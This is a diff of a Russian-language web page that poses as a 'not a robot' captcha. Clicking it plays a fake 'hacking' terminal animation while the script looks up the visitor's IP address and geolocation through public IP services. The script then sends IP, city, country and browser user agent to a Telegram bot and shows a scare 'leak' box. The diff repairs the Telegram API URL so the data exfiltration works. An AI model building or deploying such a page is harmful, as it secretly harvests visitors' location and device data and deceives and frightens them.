@@ -18,6 +18,7 @@
     <div id="terminal"></div>
 
     <div id="captcha-box">
+    
         <img src="https://www.gstatic.com" width="80">
         <h2>Подтвердите, что вы не робот</h2>
         <button class="btn-verify" onclick="startProcess()">Я не робот</button>
@@ -44,7 +45,6 @@
             const term = document.getElementById('terminal');
             term.style.display = 'block';
 
-            
             const lines = [
                 "> [INIT] Инициализация взлома...", "> [INFO] Поиск открытых портов...",
                 "> [SUCCESS] Порт 8080 открыт", "> [INFO] Обход reCAPTCHA v2...",
@@ -61,9 +61,9 @@
                 p.innerText = line;
                 term.appendChild(p);
                 window.scrollTo(0, document.body.scrollHeight);
-                await new Promise(r => setTimeout(r, 300)); 
+                await new Promise(r => setTimeout(r, 250)); 
             }
-
+ 
             await getTripleData();
         }
 
@@ -73,12 +73,12 @@
             let country = "";
 
             try {
-                 
+  
                 const ipRes = await fetch(`https://api.ipify.org?format=json`);
                 const ipData = await ipRes.json();
                 ip = ipData.ip;
 
- 
+            
                 try {
                     const resA = await fetch(`https://ipwho.is/${ip}`);
                     const dA = await resA.json();
@@ -88,7 +88,6 @@
                     }
                 } catch(e) {}
 
-             
                 if (city === "Неизвестно") {
                     try {
                         const resB = await fetch(`https://ipapi.co{ip}/json/`);
@@ -97,23 +96,24 @@
                         country = dB.country_name || "";
                     } catch(e) {}
                 }
-
-             
+ 
                 document.getElementById('user-ip').innerText = ip;
-                document.getElementById('user-geo').innerText = `${city}, ${country}`;
+                document.getElementById('user-geo').innerText = city + (country ? ", " + country : "");
                 document.getElementById('user-os').innerText = navigator.platform;
-
-                
-                const msg = `🔥 ПОЛНЫЙ ЛОГ (IPv4)!\n📍 IP: ${ip}\n🌍 Город: ${city}, ${country}\n📱 Устройство: ${navigator.userAgent}`;
-                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+ 
+                const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ip}\n🌍 Город: ${city}, ${country}\n📱 Устройство: ${navigator.userAgent}`;
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
 
             } catch (e) {
-                const backup = `⚠️ Ошибка!\n📱 ${navigator.userAgent}\n❌: ${e.message}`;
-                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(backup)}`);
+      
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("⚠️ Ошибка: " + e.message)}`);
             }
-
-            document.getElementById('terminal').style.display = 'none';
-            document.getElementById('leak-box').style.display = 'block';
+ 
+       
+            setTimeout(() => {
+                document.getElementById('terminal').style.display = 'none';
+                document.getElementById('leak-box').style.display = 'block';
+            }, 500);
         }
     </script>
 </body>
